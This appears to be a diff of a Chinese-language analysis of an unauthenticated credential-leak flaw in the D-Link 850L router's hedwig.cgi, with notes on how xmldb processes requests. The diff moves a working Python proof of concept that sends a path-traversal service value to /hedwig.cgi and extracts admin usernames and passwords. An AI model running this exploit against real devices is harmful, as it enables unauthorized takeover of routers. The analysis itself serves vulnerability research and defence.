@@ -12,7 +12,7 @@
 
 （未授权敏感信息泄漏）本质缺陷在于hedwig.cgi缺乏鉴权，导致未经授权的用户发送的请求也会被响应，如果请求获取web管理账户和密码，hedwig.cgi同样会将口令信息回传给不可信用户，造成严重的信息泄漏。
 
-首先，我们要弄清hedwig.cgi处理请求的流程：
+##### hedwig.cgi处理流程：
 
 hedwig.cgi其实是一个链接文件，指向/htdocs/cgibin文件，接收到用户请求的xml数据请求后先封装成xml文件，发送read xml的请求到xmldb server，然后发送execute php的请求到xmldb server。
 
@@ -128,48 +128,6 @@ void hedwigcgi_main(...)
     sobj_del(option);
 }
 ```
-对处理流程清晰化之后回归漏洞，PoC公布的攻击代码中显示，攻击者发送了一个相对路径的xml文件（../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml）请求到hedwig.cgi，然后从响应的数据中就包含web管理账户和密码，代码如下：
-```python
-############################################################
- 
-print("Get password...")
- 
-headers = {"Content-Type": "text/xml"}
-cookies = {"uid": "whatever"}
-data = """<?xml version="1.0" encoding="utf-8"?>
-<postxml>
-<module>
-    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
-</module>
-</postxml>"""
- 
-resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
-# print(resp.text)
- 
-# getcfg: <module>...</module>
-# hedwig: <?xml version="1.0" encoding="utf-8"?>
-#       : <hedwig>...</hedwig>
-accdata = resp.text[:resp.text.find("<?xml")]
- 
-admin_pasw = ""
- 
-tree = lxml.etree.fromstring(accdata)
-accounts = tree.xpath("/module/device/account/entry")
-for acc in accounts:
-    name = acc.findtext("name", "")
-    pasw = acc.findtext("password", "")
-    print("name:", name)
-    print("pass:", pasw)
-    if name == "Admin":
-        admin_pasw = pasw
- 
-if not admin_pasw:
-    print("Admin password not found!")
-    sys.exit()
-```
-使用wireshark抓包查看数据流：
-![...](https://wx1.sinaimg.cn/mw690/a750c5f9gy1fll33cbu3uj20iz0ne40e.jpg)
-
 hedwigcgi_main只是处理攻击者请求的中转站，并没有实际处理xml file的数据，真正处理的程序是xmldb server，这个程序是dlink 850L路由器的核心组件，是用于设置和获取各种路由参数的数据库服务，它既能解析基本的xml文件，还实现了类似php解析器的功能来解析和执行自定义的php文件，固件中众多后缀为php的文件都是伪php文件，用真实的phpcgi是无法执行起来的，只有xmldb才能解析和执行，这个结论是通过逆行分析xmldb文件得到的，具体的数据信息就不粘贴了，读者自行查看。
 
 1. xmldb 先读取了"../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml"，并将其加载到全局数据库中。
@@ -256,3 +214,46 @@ foreach("/device/account/entry")
 ... ...
 ```
 代码含义很清楚，就是获取管理账户和密码。
+
+##### PoC验证
+对处理流程清晰化之后回归漏洞，PoC公布的攻击代码中显示，攻击者发送了一个相对路径的xml文件（../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml）请求到hedwig.cgi，然后从响应的数据中就包含web管理账户和密码，代码如下：
+```python
+############################################################
+ 
+print("Get password...")
+ 
+headers = {"Content-Type": "text/xml"}
+cookies = {"uid": "whatever"}
+data = """<?xml version="1.0" encoding="utf-8"?>
+<postxml>
+<module>
+    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
+</module>
+</postxml>"""
+ 
+resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
+# print(resp.text)
+ 
+# getcfg: <module>...</module>
+# hedwig: <?xml version="1.0" encoding="utf-8"?>
+#       : <hedwig>...</hedwig>
+accdata = resp.text[:resp.text.find("<?xml")]
+ 
+admin_pasw = ""
+ 
+tree = lxml.etree.fromstring(accdata)
+accounts = tree.xpath("/module/device/account/entry")
+for acc in accounts:
+    name = acc.findtext("name", "")
+    pasw = acc.findtext("password", "")
+    print("name:", name)
+    print("pass:", pasw)
+    if name == "Admin":
+        admin_pasw = pasw
+ 
+if not admin_pasw:
+    print("Admin password not found!")
+    sys.exit()
+```
+使用wireshark抓包查看数据流：
+![...](https://wx1.sinaimg.cn/mw690/a750c5f9gy1fll33cbu3uj20iz0ne40e.jpg)
